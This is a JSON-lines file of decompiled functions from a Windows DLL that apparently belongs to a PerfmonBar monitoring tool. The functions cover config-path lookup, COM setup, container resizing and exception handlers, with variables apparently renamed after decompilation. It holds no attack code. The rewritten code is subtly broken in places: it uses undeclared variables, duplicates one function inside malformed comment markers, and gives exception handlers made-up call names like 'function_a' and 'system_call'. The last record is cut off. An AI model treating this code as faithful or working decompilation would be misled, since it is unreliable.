{"Function Name": "FUN_1000acf0", "Address": "1000acf0", "Source Code": "void __fastcall FUN_1000acf0(void **param_1)\n{\n    int integerVar; \n    undefined8 uint64Var; \n    short shortVar; \n    code *functionPtr; \n    void *voidPtr1; \n    void *voidPtr2; \n    void *voidPtr3; \n    uint unsignedIntVar; \n    int returnValue; \n    undefined8 *pointerToLocal230; \n    uint unsignedStackVar; \n    undefined8 local64Var1; \n    undefined8 local64Var2; \n    uint localUnsignedIntVar; \n    undefined *stackPointer1; \n    void *localPointer; \n    undefined *stackPointer2; \n    undefined4 local32Var; \n    stackPointer1 = &stack0xfffffffc; \n    local32Var = 0xffffffff; \n    stackPointer2 = &LAB_100387bb; \n    localPointer = ExceptionList; \n    unsignedIntVar = DAT_1004e008 ^ (uint)&stack0xfffffff0; \n    ExceptionList = &localPointer; \n    local64Var1 = CONCAT44(param_1,(uint)local64Var1); \n    localUnsignedIntVar = unsignedIntVar; \n    _memset(&local64Var2, 0, 0x208); \n    returnValue = SHGetFolderPathW(0, 0x1a, 0, 0, &local64Var2, unsignedIntVar); \n    if (-1 < returnValue) { \n        int localCount = 0; \n        pointerToLocal230 = &local64Var2; \n        unsignedStackVar = 7; \n        do {\n            shortVar = *(short *)pointerToLocal230; \n            pointerToLocal230 = (undefined8 *)((int)pointerToLocal230 + 2); \n        } while (shortVar != 0); \n        \n        FUN_1000b690(&localBuffer, &local64Var2, (void *)((int)pointerToLocal230 - ((int)&local64Var2 + 2) >> 1)); \n        local32Var = 0; \n        if (unsignedStackVar - localCount < 0x16) { \n            pointerToLocal230 = FUN_1000cad0(&localBuffer, 0x16, local64Var1._4_4_, (undefined8 *)L\"\\\\PerfmonBar\\\\config.xml\", 0x16); \n        } else {\n            pointerToLocal230 = (unsignedStackVar > 7) ? localBuffer : (undefined8 *)&localBuffer; \n            returnValue = localCount + 0x16; \n            localCount = returnValue; \n            FUN_10018bf0((undefined8 *)((int)pointerToLocal230 + localCount * 2), (undefined8 *)L\"\\\\PerfmonBar\\\\config.xml\", 0x2c); \n            *(undefined2 *)((int)pointerToLocal230 + localCount * 2) = 0; \n        }\n        \n        voidPtr1 = *(void **)pointerToLocal230; \n        voidPtr2 = *(void **)(pointerToLocal230 + 1); \n        voidPtr3 = *(void **)((int)pointerToLocal230 + 0xc); \n        uint64Var = pointerToLocal230[2]; \n        *(int *)(pointerToLocal230 + 2) = 0; \n        *(int *)((int)pointerToLocal230 + 0x14) = 7; \n        *(undefined2 *)pointerToLocal230 = 0; \n        if (param_1 == &local_268) { \n            if (7 < (uint)((ulonglong)uint64Var >> 0x20)) { \n                if ((0xfff < (uint)((ulonglong)uint64Var >> 0x20) * 2 + 2) && \n                    (voidPtr1 = *(void **)((int)voidPtr1 + -4), 0x1f < (uint)((int)voidPtr1 + (-4 - (int)voidPtr1)))) { \n                    FUN_1001dea6(); \n                    goto LAB_1000af31; \n                }\n                FUN_10013ceb(voidPtr1); \n            }\n        } else {\n            FUN_10009470(param_1); \n            *param_1 = voidPtr1; \n            param_1[1] = *(void **)((int)pointerToLocal230 + 4); \n            param_1[2] = voidPtr2; \n            param_1[3] = voidPtr3; \n            *(undefined8 *)(param_1 + 4) = local64Var1; \n        }\n        if (7 < unsignedStackVar) { \n            if ((0xfff < unsignedStackVar * 2 + 2) && \n                (pointerToLocal230 = *(undefined8 **)((int)localBuffer + -4), 0x1f < (uint)((int)localBuffer + (-4 - (int)pointerToLocal230)))) { \n                LAB_1000af31: \n                FUN_1001dea6(); \n                functionPtr = (code *)swi(3); \n                (*functionPtr)(); \n                return; \n            }\n            FUN_10013ceb(pointerToLocal230); \n        }\n    }\n    ExceptionList = localPointer; \n    ___security_check_cookie_4(localUnsignedIntVar ^ (uint)&stack0xfffffff0); \n    return; \n}"}
{"Function Name": "FUN_1000af40", "Address": "1000af40", "Source Code": "void __fastcall FUN_1000af40(int *param_1)\n{\n    HRESULT resultCode; \n    int indexValue; \n    int *intPointer; \n    int *secondIntPointer; \n    LPUNKNOWN unknownInterface; \n    undefined4 ******pointerArray[4]; \n    uint statusCode; \n    undefined undefinedValue; \n    void *originalExceptionList; \n    uint securityCookie; \n    originalExceptionList = ExceptionList; \n    securityCookie = DAT_1004e008 ^ (uint)&stack0xfffffff0; \n    ExceptionList = &originalExceptionList; \n    if ((DAT_100504d8 == '\\0') && (resultCode = CoInitialize((LPVOID)0x0), -1 < resultCode)) { \n        DAT_100504d8 = '\\x01'; \n    }\n    local_14 = 0; \n    FUN_1000b4b0((int **)(param_1 + 1)); \n    if ((uint)(param_1[5] - param_1[3] >> 2) < 0x10) { \n        FUN_1000ba50(param_1 + 3, 0x10); \n    }\n    secondIntPointer = (int *)param_1[1]; \n    FUN_1000b7e0(param_1 + 3, 0x10, &secondIntPointer); \n    secondIntPointer = param_1 + 8; \n    param_1[6] = 7; \n    param_1[7] = 8; \n    indexValue = param_1[9]; \n    int currentValue = *secondIntPointer; \n    if (currentValue != indexValue) { \n        do {\n            FUN_1000b580((int *)(currentValue + 4)); \n            currentValue += 0x10; \n        } while (currentValue != indexValue); \n    }\n    secondIntPointer[1] = currentValue; \n    intPointer = (int *)0x0; \n    resultCode = CoCreateInstance((IID *)&DAT_1003a3a0, (LPUNKNOWN)0x0, 0x17, (IID *)&DAT_10047bdc, &unknownInterface); \n    if (resultCode < 0) { \n        goto LAB_1000b37e; \n    }\n    resultCode = OleRun(unknownInterface); \n    if (-1 < resultCode) { \n        resultCode = (*unknownInterface->lpVtbl->QueryInterface)(unknownInterface, (IID *)&DAT_10047bcc, &intPointer); \n    }\n    (*unknownInterface->lpVtbl->Release)(unknownInterface); \n    if (resultCode < 0) goto LAB_1000b37e; \n    statusCode = 7; \n    pointerArray[0] = (undefined4 ******)((uint)pointerArray[0] & 0xffff0000); \n    indexValue = FUN_1000acf0(pointerArray); \n    if (indexValue != 0) { \n        undefinedValue = 0; \n        goto LAB_1000b37e; \n    }\n    if (7 < statusCode) { \n        undefined4 ******pointerToFirstElement = pointerArray[0]; \n        if ((0xfff < statusCode * 2 + 2) && (pointerToFirstElement = (undefined4 ******)pointerArray[0][-1], 0x1f < (uint)((int)pointerArray[0] + (-4 - (int)pointerToFirstElement)))) { \n            goto LAB_1000b3e2; \n        }\n        FUN_10013ceb(pointerToFirstElement); \n    }\n    statusCode = 7; \nLAB_1000b37e:\n    if (intPointer != (int *)0x0) { \n        (**(code **)(*intPointer + 8))(intPointer); \n    }\n    ExceptionList = originalExceptionList; \n    ___security_check_cookie_4(securityCookie ^ (uint)&stack0xfffffff0); \n    return; \nLAB_1000b3e2:\n    FUN_1001dea6(); \n    pcVar10 = (code *)swi(3); \n    (*pcVar10)(); \n    return; \n}"}
{"Function Name": "FUN_1000b490", "Address": "1000b490", "Source Code": "void __fastcall FUN_1000b490(void **element_list)\n{\n    void **current_element; \n    \n    while (*element_list != (void *)0x0) {\n        current_element = (void **)*element_list; \n        *element_list = *current_element; \n        FUN_1001dc78(current_element); \n    }\n    return; \n}"}
{"Function Name": "FUN_1000b4b0", "Address": "1000b4b0", "Source Code": "void __fastcall FUN_1000b4b0(int **pointerArray)\n{\n    \n    int **firstPointer = (int **)*pointerArray;\n    \n    \n    int *currentPointer = *firstPointer;\n    \n    \n    *firstPointer = (int *)firstPointer;\n    \n    \n    (*pointerArray)[1] = (int)*pointerArray;\n    \n    \n    pointerArray[1] = (int *)0x0;\n    \n    if (currentPointer != *pointerArray) {\n        \n        do {\n            \n            int *nextPointer = (int *)*currentPointer;\n            \n            \n            FUN_1000c270((void **)(currentPointer + 2));\n            \n            \n            FUN_10013ceb(currentPointer);\n            \n            \n            currentPointer = nextPointer;\n        } while (nextPointer != *pointerArray); \n    }\n}"}
{"Function Name": "FUN_1000b690", "Address": "1000b690", "Source Code": "\\*\nundefined8 * __thiscall FUN_1000b690(void *this, undefined8 *inputParam1, void *inputParam2)\n{\n    \n    void *pointerOffset14 = *(void **)((int)this + 0x14);\n    undefined8 *thisPointer = (undefined8 *)this; \n    \n    if (inputParam2 <= pointerOffset14) {\n        \n        if ((void *)0x7 < pointerOffset14) {\n            thisPointer = *this; \n        }\n        \n        *(void **)((int)this + 0x10) = inputParam2;\n        \n        FUN_10018bf0(thisPointer, inputParam1, (int)inputParam2 * 2);\n        \n        *(undefined2 *)((int)inputParam2 * 2 + (int)thisPointer) = 0;\n        return thisPointer; \n    }\n    \n    uint adjustedParam2 = (uint)inputParam2 | 7;\n    \n    if (adjustedParam2 < 0x7fffffff) {\n        \n        if ((void *)(0x7ffffffe - ((uint)pointerOffset14 >> 1)) < pointerOffset14) {\n            adjustedParam2 = 0x7ffffffe; \n        } else {\n            \n            uint calculatedSize = ((uint)pointerOffset14 >> 1) + (int)pointerOffset14;\n            \n            if (adjustedParam2 < calculatedSize) {\n                adjustedParam2 = calculatedSize;\n            }\n        }\n    } else {\n        adjustedParam2 = 0x7ffffffe; \n    }\n    \n    uint calculatedSize = (adjustedParam2 + 1) * 2;\n    \n    if (adjustedParam2 + 1 < 0x80000000) {\n        \n        if (0xfff < calculatedSize) goto LAB_1000b733; \n        \n        thisPointer = (calculatedSize == 0) ? (undefined8 *)0x0 : (undefined8 *)FUN_10013cf9(calculatedSize);\n        \n        \n        *(uint *)((int)this + 0x14) = adjustedParam2;\n        *(void **)((int)this + 0x10) = inputParam2;\n        \n        FUN_10018670(thisPointer, inputParam1, (int)inputParam2 * 2);\n        \n        *(undefined2 *)((int)inputParam2 * 2 + (int)thisPointer) = 0;\n        \n        if (pointerOffset14 < (void *)0x8) {\n            *(undefined8 **)this = thisPointer; \n            return thisPointer; \n        }\n        \n        void *storedPointer = *this;\n        \n        if (((int)pointerOffset14 * 2 + 2U < 0x1000) || ((uint)((int)storedPointer + (-4 - (int)*(void **)((int)storedPointer - 4))) < 0x20)) {\n            FUN_10013ceb(*(void **)((int)storedPointer - 4)); \n            *(undefined8 **)this = thisPointer; \n            return thisPointer; \n        }\n    } else {\n        calculatedSize = 0xffffffff; \n    }\nLAB_1000b733:\n    \n    uint finalSize = calculatedSize + 0x23;\n    \n    if (finalSize <= calculatedSize) {\n        finalSize = 0xffffffff; \n    }\n    \n    int allocatedSize = FUN_10013cf9(finalSize);\n    if (allocatedSize != 0) {\n        \n        thisPointer = (undefined8 *)(allocatedSize + 0x23U & 0xffffffe0);\n        *(int *)((int)thisPointer - 4) = allocatedSize; \n    }\n    FUN_1001dea6(); \nLAB_1000b7cf:\n    FUN_10005260(); \n    code *pcVar3 = (code *)swi(3); \n    thisPointer = (undefined8 *)(*pcVar3)(); \n    return thisPointer; \n}\n*\\ \n \nundefined8 * __thiscall FUN_1000b690(void *this, undefined8 *inputParam1, void *inputParam2)\n{\n    void *pointerOffset14 = *(void **)((int)this + 0x14);\n    undefined8 *thisPointer = (undefined8 *)this;\n    if (inputParam2 <= pointerOffset14) {\n        if ((void *)0x7 < pointerOffset14) {\n            thisPointer = *this;\n        }\n        *(void **)((int)this + 0x10) = inputParam2;\n        FUN_10018bf0(thisPointer, inputParam1, (int)inputParam2 * 2);\n        *(undefined2 *)((int)inputParam2 * 2 + (int)thisPointer) = 0;\n        return thisPointer;\n    }\n    uint adjustedParam2 = (uint)inputParam2 | 7;\n    if (adjustedParam2 < 0x7fffffff) {\n        if ((void *)(0x7ffffffe - ((uint)pointerOffset14 >> 1)) < pointerOffset14) {\n            adjustedParam2 = 0x7ffffffe;\n        } else {\n            uint calculatedSize = ((uint)pointerOffset14 >> 1) + (int)pointerOffset14;\n            if (adjustedParam2 < calculatedSize) {\n                adjustedParam2 = calculatedSize;\n            }\n        }\n    } else {\n        adjustedParam2 = 0x7ffffffe;\n    }\n    uint calculatedSize = (adjustedParam2 + 1) * 2;\n    if (adjustedParam2 + 1 < 0x80000000) {\n        if (0xfff < calculatedSize) goto LAB_1000b733;\n        thisPointer = (calculatedSize == 0) ? (undefined8 *)0x0 : (undefined8 *)FUN_10013cf9(calculatedSize);\n        \n        *(uint *)((int)this + 0x14) = adjustedParam2;\n        *(void **)((int)this + 0x10) = inputParam2;\n        FUN_10018670(thisPointer, inputParam1, (int)inputParam2 * 2);\n        *(undefined2 *)((int)inputParam2 * 2 + (int)thisPointer) = 0;\n        if (pointerOffset14 < (void *)0x8) {\n            *(undefined8 **)this = thisPointer;\n            return thisPointer;\n        }\n        void *storedPointer = *this;\n        if (((int)pointerOffset14 * 2 + 2U < 0x1000) || ((uint)((int)storedPointer + (-4 - (int)*(void **)((int)storedPointer - 4))) < 0x20)) {\n            FUN_10013ceb(*(void **)((int)storedPointer - 4));\n            *(undefined8 **)this = thisPointer;\n            return thisPointer;\n        }\n    } else {\n        calculatedSize = 0xffffffff;\n    }\nLAB_1000b733:\n    uint finalSize = calculatedSize + 0x23;\n    if (finalSize <= calculatedSize) {\n        finalSize = 0xffffffff;\n    }\n    int allocatedSize = FUN_10013cf9(finalSize);\n    if (allocatedSize != 0) {\n        thisPointer = (undefined8 *)(allocatedSize + 0x23U & 0xffffffe0);\n        *(int *)((int)thisPointer - 4) = allocatedSize;\n    }\n    FUN_1001dea6();\nLAB_1000b7cf:\n    FUN_10005260();\n    code *pcVar3 = (code *)swi(3);\n    thisPointer = (undefined8 *)(*pcVar3)();\n    return thisPointer;\n}"}
{"Function Name": "FUN_1000b7e0", "Address": "1000b7e0", "Source Code": "void __thiscall FUN_1000b7e0(void *this, uint param_1, undefined4 *param_2)\n{\n    undefined4 *currentDataPointer = *this; \n    uint allocatedMemorySize = (*(int *)((int)this + 8) - (int)currentDataPointer) >> 2; \n    uint usedElementsCount = (*(int *)((int)this + 4) - (int)currentDataPointer) >> 2; \n    \n    if (param_1 <= allocatedMemorySize) { \n        if (param_1 <= usedElementsCount) { \n            FUN_1000c1f0(currentDataPointer, currentDataPointer + param_1, param_2); \n            *(undefined4 **)((int)this + 4) = currentDataPointer + param_1; \n            return;\n        }\n        FUN_1000c1f0(currentDataPointer, *(undefined4 **)((int)this + 4), param_2); \n        currentDataPointer = *(undefined4 **)((int)this + 4); \n        for (int newElementsToAddCount = param_1 - usedElementsCount; newElementsToAddCount != 0; newElementsToAddCount--) { \n            *currentDataPointer++ = *param_2; \n        }\n        *(undefined4 **)((int)this + 4) = currentDataPointer; \n        return;\n    }\n    \n    if (0x3fffffff < param_1) { \n        FUN_10005250(); \n        return;\n    }\n    \n    uint newAllocationSize = (0x3fffffff - (allocatedMemorySize >> 1) < allocatedMemorySize) ? param_1 : (allocatedMemorySize >> 1) + allocatedMemorySize; \n    if (newAllocationSize < param_1) { \n        newAllocationSize = param_1;\n    }\n    \n    if (currentDataPointer != (undefined4 *)0x0) { \n        undefined4 *tempPointer = currentDataPointer; \n        if ((allocatedMemorySize * 4 < 0x1000) || (tempPointer = currentDataPointer[-1], (uint)((int)currentDataPointer + (-4 - (int)tempPointer)) < 0x20)) { \n            FUN_10013ceb(tempPointer); \n            *(undefined4 *)this = 0; \n            *(undefined4 *)((int)this + 4) = 0; \n            *(undefined4 *)((int)this + 8) = 0; \n            if (newAllocationSize != 0) { \n                if (0x3fffffff < newAllocationSize) { \n                    FUN_10005250(); \n                    return;\n                }\n                newAllocationSize *= 4; \n                uint usedElementsCount = (newAllocationSize < 0x1000) ? (newAllocationSize == 0 ? 0 : FUN_10013cf9(newAllocationSize)) : (FUN_10013cf9(newAllocationSize + 0x23) + 0x23U & 0xffffffe0); \n                *(int *)(usedElementsCount - 4) = usedElementsCount; \n                *(uint *)this = usedElementsCount; \n                *(uint *)((int)this + 4) = usedElementsCount; \n                *(uint *)((int)this + 8) = *this + newAllocationSize; \n            }\n        }\n    }\n    \n    if (param_1 != 0) { \n        do {\n            *currentDataPointer++ = *param_2; \n            param_1--; \n        } while (param_1 != 0); \n        *(undefined4 **)((int)this + 4) = currentDataPointer; \n    }\n}"}
{"Function Name": "FUN_1000ba10", "Address": "1000ba10", "Source Code": "void FUN_1000ba10(void *input_pointer, int multiplier)\n{\n    void *previous_pointer = input_pointer; \n    \n    \n    if ((0xfff < (uint)(multiplier * 0x58)) &&\n        (previous_pointer = *(void **)((int)input_pointer + -4), 0x1f < (uint)((int)input_pointer + (-4 - (int)previous_pointer)))) {\n        \n        FUN_1001dea6(); \n        ((code *)swi(3))(); \n        return; \n    }\n    FUN_10013ceb(previous_pointer); \n}"}
{"Function Name": "FUN_1000ba50", "Address": "1000ba50", "Source Code": "void __thiscall FUN_1000ba50(void *this, uint param_1)\n{\n    uint scaledParamValue; \n    int offsetValue;  \n    int thisValue;  \n    uint calculatedSize; \n    int offsetCalculation;  \n    undefined4 *dataPointer; \n    uint finalCalculatedValue; \n    offsetValue = *(int *)((int)this + 4); \n    thisValue = *this; \n    scaledParamValue = param_1 * 4; \n    \n    if (param_1 < 0x40000000) { \n        if (scaledParamValue == 0) { \n            finalCalculatedValue = 0; \n        } else if (scaledParamValue > 0xfff) { \n            finalCalculatedValue = FUN_10013cf9(scaledParamValue) + 0x23U & 0xffffffe0; \n            *(int *)(finalCalculatedValue - 4) = finalCalculatedValue - 0x23U; \n        } else {\n            finalCalculatedValue = scaledParamValue; \n        }\n    } else {\n        finalCalculatedValue = 0xffffffff; \n    }\n    calculatedSize = (*(int *)((int)this + 4) - (int)(dataPointer = *this) + 3U) >> 2; \n    if (*(undefined4 **)((int)this + 4) < dataPointer) { \n        calculatedSize = 0; \n    }\n    if (calculatedSize != 0) { \n        offsetCalculation = finalCalculatedValue - (int)dataPointer; \n        for (uint loopIndex = 0; loopIndex < calculatedSize; loopIndex++) { \n            *(undefined4 *)(offsetCalculation + -4 + (int)dataPointer + loopIndex * 4) = dataPointer[loopIndex]; \n        }\n    }\n    if (dataPointer != (undefined4 *)0x0) { \n        if ((0xfff < (*(int *)((int)this + 8) - (int)dataPointer & 0xfffffffcU)) && \n            (0x1f < (uint)((int)dataPointer + (-4 - (int)dataPointer[-1])))) { \n            FUN_1001dea6(); \n            ((code *)swi(3))(); \n            return; \n        }\n        FUN_10013ceb(dataPointer[-1]); \n    }\n    *(uint *)this = finalCalculatedValue; \n    *(uint *)((int)this + 4) = finalCalculatedValue + (offsetValue - thisValue >> 2) * 4; \n    *(uint *)((int)this + 8) = scaledParamValue + finalCalculatedValue; \n}"}
{"Function Name": "Catch_All@1000bcfc", "Address": "1000bcfc", "Source Code": "void Catch_All_1000bcfc(void)\n{\n    \n    function_a(*(int *)(base_pointer + -0x1c), *(int *)(base_pointer + -0x1c));\n    \n    \n    function_b(*(void **)(base_pointer + -0x14), *(int *)(base_pointer + -0x20));\n    \n    \n    throw_exception((int *)0x0, (byte *)0x0);\n    \n    \n    cleanup_function();\n    \n    \n    process_function();\n    \n    \n    ((code *)system_call(3))();\n}"}
{"Function Name": "FUN_1000bd30", "Address": "1000bd30", "Source Code": "int __thiscall FUN_1000bd30(void *this, undefined4 *param_1, undefined8 *param_2)\n{\n    undefined4 *currentObjectPointer; \n    int param1Index;           \n    int currentObjectIndex;           \n    uint adjustedSize;          \n    uint sizeCalculation;          \n    int baseAddress;           \n    undefined4 *memoryPointer; \n    void **currentObjectLoopPointer;     \n    void **endObjectArrayPointer;     \n    undefined4 *firstElementPointer;  \n    undefined4 *param1Pointer;  \n    void *previousExceptionList;      \n    previousExceptionList = ExceptionList; \n    ExceptionList = &previousExceptionList; \n    baseAddress = *this; \n    param1Index = ((int)param_1 - baseAddress) / 0x38; \n    currentObjectIndex = (*(int *)((int)this + 4) - baseAddress) / 0x38; \n    if (currentObjectIndex == 0x4924924) { \n        FUN_10005250(); \n        goto LAB_1000bf96; \n    }\n    sizeCalculation = (*(int *)((int)this + 8) - baseAddress) / 0x38; \n    adjustedSize = currentObjectIndex + 1; \n    if ((sizeCalculation <= 0x4924924 - (sizeCalculation >> 1)) && (adjustedSize = (sizeCalculation >> 1) + sizeCalculation, adjustedSize < (currentObjectIndex + 1))) {\n        adjustedSize = (currentObjectIndex + 1); \n    }\n    if (adjustedSize < 0x4924925) { \n        if (0xfff < adjustedSize * 0x38) goto LAB_1000be0a; \n        memoryPointer = (adjustedSize == 0) ? (undefined4 *)0x0 : (undefined4 *)FUN_10013cf9(adjustedSize * 0x38); \n    } else {\n        adjustedSize = 0xffffffff; \nLAB_1000be0a:\n        sizeCalculation = adjustedSize + 0x23; \n        if (sizeCalculation <= adjustedSize) {\n            sizeCalculation = 0xffffffff; \n        }\n        baseAddress = FUN_10013cf9(sizeCalculation); \n        if (baseAddress == 0) goto LAB_1000bf96; \n        memoryPointer = (undefined4 *)(baseAddress + 0x23U & 0xffffffe0); \n        memoryPointer[-1] = baseAddress; \n    }\n    currentObjectPointer = memoryPointer + param1Index * 0xe; \n    FUN_1000c630(currentObjectPointer, param_2); \n    *(undefined *)(currentObjectPointer + 6) = *(undefined *)(param_2 + 3); \n    *(undefined *)((int)currentObjectPointer + 0x19) = *(undefined *)((int)param_2 + 0x19); \n    currentObjectPointer[7] = *(undefined4 *)((int)param_2 + 0x1c); \n    *(undefined8 *)(currentObjectPointer + 8) = param_2[4]; \n    FUN_1000c4a0(currentObjectPointer + 10, (int *)(param_2 + 5)); \n    firstElementPointer = *(undefined4 **)((int)this + 4); \n    param1Pointer = *this; \n    if (param_1 != firstElementPointer) { \n        FUN_1000c920(*this, param_1, memoryPointer); \n        firstElementPointer = *(undefined4 **)((int)this + 4); \n        param1Pointer = param_1; \n    }\n    FUN_1000c920(param1Pointer, firstElementPointer, currentObjectPointer + 0xe); \n    currentObjectLoopPointer = *this; \n    if (currentObjectLoopPointer != (void **)0x0) { \n        endObjectArrayPointer = *(void ***)((int)this + 4); \n        if (currentObjectLoopPointer != endObjectArrayPointer) { \n            do {\n                FUN_10009410(currentObjectLoopPointer); \n                currentObjectLoopPointer = currentObjectLoopPointer + 0xe; \n            } while (currentObjectLoopPointer != endObjectArrayPointer); \n        }\n    }\n    if ((0xfff < (uint)(((*(int *)((int)this + 8) - (int)currentObjectLoopPointer) / 0x38) * 0x38)) &&\n        (endObjectArrayPointer = (void **)currentObjectLoopPointer[-1], 0x1f < (uint)((int)currentObjectLoopPointer + (-4 - (int)endObjectArrayPointer)))) {\nLAB_1000bf96:\n        FUN_1001dea6(); \n        return ((code *)swi(3))(); \n    }\n    FUN_10013ceb(endObjectArrayPointer); \n    *(undefined4 **)this = memoryPointer; \n    *(undefined4 **)((int)this + 4) = memoryPointer + (currentObjectIndex + 1) * 0xe; \n    *(undefined4 **)((int)this + 8) = memoryPointer + adjustedSize * 0xe; \n    ExceptionList = previousExceptionList; \n    return *this + param1Index * 0x38; \n}"}
{"Function Name": "Catch_All@1000bf73", "Address": "1000bf73", "Source Code": "void Catch_All_1000bf73(void)\n{\n    \n    function_call_1(*(void ***)(base_pointer + -0x14), *(void ***)(base_pointer + -0x14));\n    \n    \n    function_call_2(*(void **)(base_pointer + -0x18), *(int *)(base_pointer + -0x24));\n    \n    \n    throw_exception((int *)0x0, (byte *)0x0);\n    \n    \n    cleanup_function();\n    \n    \n    processing_function();\n    \n    \n    ((code *)system_call(3))();\n}"}
{"Function Name": "FUN_1000bfa0", "Address": "1000bfa0", "Source Code": "int __thiscall FUN_1000bfa0(void *this, undefined4 *param_1, undefined8 *param_2)\n{\n    uint calculatedIndex1; \n    undefined4 *currentObjectPointer; \n    code *functionPointer; \n    int index1; \n    int index2; \n    uint calculatedUnsignedInt1; \n    uint calculatedUnsignedInt2; \n    int allocatedMemorySize; \n    uint calculatedUnsignedInt3; \n    undefined4 *allocatedMemoryPointer; \n    void **firstElementPointer; \n    void **endPointer; \n    undefined4 *objectDataPointer1; \n    undefined4 *currentObjectPointer2; \n    void *previousExceptionList; \n    previousExceptionList = ExceptionList; \n    ExceptionList = &previousExceptionList; \n    allocatedMemorySize = *this; \n    index1 = ((int)param_1 - allocatedMemorySize) / 0x58; \n    index2 = (*(int *)((int)this + 4) - allocatedMemorySize) / 0x58; \n    if (index2 == 0x2e8ba2e) { \n        FUN_10005250(); \n        goto LAB_1000c1e5; \n    }\n    calculatedIndex1 = index2 + 1; \n    calculatedUnsignedInt3 = (*(int *)((int)this + 8) - allocatedMemorySize) / 0x58; \n    calculatedUnsignedInt1 = calculatedIndex1; \n    if ((calculatedUnsignedInt3 <= 0x2e8ba2e - (calculatedUnsignedInt3 >> 1)) && (calculatedUnsignedInt1 = (calculatedUnsignedInt3 >> 1) + calculatedUnsignedInt3, calculatedUnsignedInt1 < calculatedIndex1)) {\n        calculatedUnsignedInt1 = calculatedIndex1; \n    }\n    calculatedUnsignedInt3 = calculatedUnsignedInt1 * 0x58; \n    if (calculatedUnsignedInt1 < 0x2e8ba2f) { \n        if (0xfff < calculatedUnsignedInt3) goto LAB_1000c06b; \n        allocatedMemoryPointer = (calculatedUnsignedInt3 == 0) ? (undefined4 *)0x0 : (undefined4 *)FUN_10013cf9(calculatedUnsignedInt3); \n    } else {\n        calculatedUnsignedInt3 = 0xffffffff; \n    LAB_1000c06b:\n        calculatedUnsignedInt2 = calculatedUnsignedInt3 + 0x23; \n        if (calculatedUnsignedInt2 <= calculatedUnsignedInt3) {\n            calculatedUnsignedInt2 = 0xffffffff; \n        }\n        allocatedMemorySize = FUN_10013cf9(calculatedUnsignedInt2); \n        if (allocatedMemorySize == 0) goto LAB_1000c1e5; \n        allocatedMemoryPointer = (undefined4 *)(allocatedMemorySize + 0x23U & 0xffffffe0); \n        allocatedMemoryPointer[-1] = allocatedMemorySize; \n    }\n    currentObjectPointer = allocatedMemoryPointer + index1 * 0x16; \n    FUN_1000c630(currentObjectPointer, param_2); \n    FUN_1000c630(currentObjectPointer + 6, param_2 + 3); \n    FUN_1000c630(currentObjectPointer + 0xc, param_2 + 6); \n    currentObjectPointer[0x12] = *(undefined4 *)(param_2 + 9); \n    currentObjectPointer[0x13] = *(undefined4 *)((int)param_2 + 0x4c); \n    *(undefined8 *)(currentObjectPointer + 0x14) = param_2[10]; \n    objectDataPointer1 = *(undefined4 **)((int)this + 4); \n    currentObjectPointer2 = *this; \n    if (param_1 != objectDataPointer1) { \n        FUN_1000c9f0(*this, param_1, allocatedMemoryPointer); \n        objectDataPointer1 = *(undefined4 **)((int)this + 4); \n        currentObjectPointer2 = param_1; \n    }\n    FUN_1000c9f0(currentObjectPointer2, objectDataPointer1, currentObjectPointer + 0x16); \n    firstElementPointer = *this; \n    if (firstElementPointer != (void **)0x0) { \n        endPointer = *(void ***)((int)this + 4); \n        if (firstElementPointer != endPointer) { \n            do {\n                FUN_10009f90(firstElementPointer); \n                firstElementPointer = firstElementPointer + 0x16; \n            } while (firstElementPointer != endPointer); \n        }\n    }\n    if ((0xfff < (uint)(((*(int *)((int)this + 8) - (int)firstElementPointer) / 0x58) * 0x58)) &&\n        (endPointer = (void **)firstElementPointer[-1], 0x1f < (uint)((int)firstElementPointer + (-4 - (int)endPointer)))) {\n    LAB_1000c1e5:\n        FUN_1001dea6(); \n        functionPointer = (code *)swi(3); \n        return (*functionPointer)(); \n    }\n    FUN_10013ceb(endPointer); \n    *(undefined4 **)this = allocatedMemoryPointer; \n    *(undefined4 **)((int)this + 4) = allocatedMemoryPointer + calculatedIndex1 * 0x16; \n    *(undefined4 **)((int)this + 8) = allocatedMemoryPointer + calculatedUnsignedInt1 * 0x16; \n    ExceptionList = previousExceptionList; \n    return *this + index1 * 0x58; \n}"}
{"Function Name": "Catch_All@1000c1c2", "Address": "1000c1c2", "Source Code": "void Catch_All_1000c1c2(void)\n{\n    \n    function_call_1(*(void ***)(base_pointer + -0x14), *(void ***)(base_pointer + -0x14));\n    \n    \n    function_call_2(*(void **)(base_pointer + -0x1c), *(int *)(base_pointer + -0x24));\n    \n    \n    throw_exception((int *)0x0, (byte *)0x0);\n    \n    \n    cleanup_function();\n    \n    \n    unknown_function();\n    \n    \n    ((code *)system_call(3))();\n}"}
{"Function Name": "FUN_1000c310", "Address": "1000c310", "Source Code": "void __thiscall FUN_1000c310(void *this, int *param_1)\n{\n    uint security_cookie; \n    uint allocated_size; \n    int return_value;  \n    uint element_count; \n    void *current_position; \n    undefined8 *end_of_param_array; \n    undefined8 *current_param_element; \n    security_cookie = DAT_1004e008 ^ (uint)&stack0xfffffffc; \n    ExceptionList = ExceptionList; \n    *(undefined4 *)this = 0; \n    *(undefined4 *)((int)this + 4) = 0; \n    *(undefined4 *)((int)this + 8) = 0; \n    element_count = (param_1[1] - *param_1) / 0x38; \n    if (element_count != 0) { \n        if (0x4924924 < element_count) { \n            FUN_10005250(); \n            FUN_1001dea6(); \n            FUN_1000b580((int *)this); \n            __CxxThrowException_8((int *)0x0, (byte *)0x0); \n            return; \n        }\n        element_count = element_count * 0x38; \n        if (element_count < 0x1000) { \n            allocated_size = (element_count == 0) ? 0 : FUN_10013cf9(element_count); \n        } else {\n            allocated_size = element_count + 0x23; \n            if (allocated_size <= element_count) { \n                allocated_size = 0xffffffff; \n            }\n            return_value = FUN_10013cf9(allocated_size); \n            if (return_value == 0) { \n                FUN_10005250(); \n                return; \n            }\n            allocated_size = return_value + 0x23U & 0xffffffe0; \n            *(int *)(allocated_size - 4) = return_value; \n        }\n        *(uint *)this = allocated_size; \n        *(uint *)((int)this + 4) = allocated_size; \n        *(uint *)((int)this + 8) = *this + element_count; \n        current_position = *this; \n        end_of_param_array = (undefined8 *)param_1[1]; \n        current_param_element = (undefined8 *)*param_1; \n        for (; current_param_element != end_of_param_array; current_param_element = current_param_element + 7) { \n            FUN_1000c630(current_position, current_param_element); \n            *(undefined *)((int)current_position + 0x18) = *(undefined *)(current_param_element + 3); \n            *(undefined *)((int)current_position + 0x19) = *(undefined *)((int)current_param_element + 0x19); \n            *(undefined4 *)((int)current_position + 0x1c) = *(undefined4 *)((int)current_param_element + 0x1c); \n            *(undefined8 *)((int)current_position + 0x20) = current_param_element[4]; \n            FUN_1000c4a0((void *)((int)current_position + 0x28), 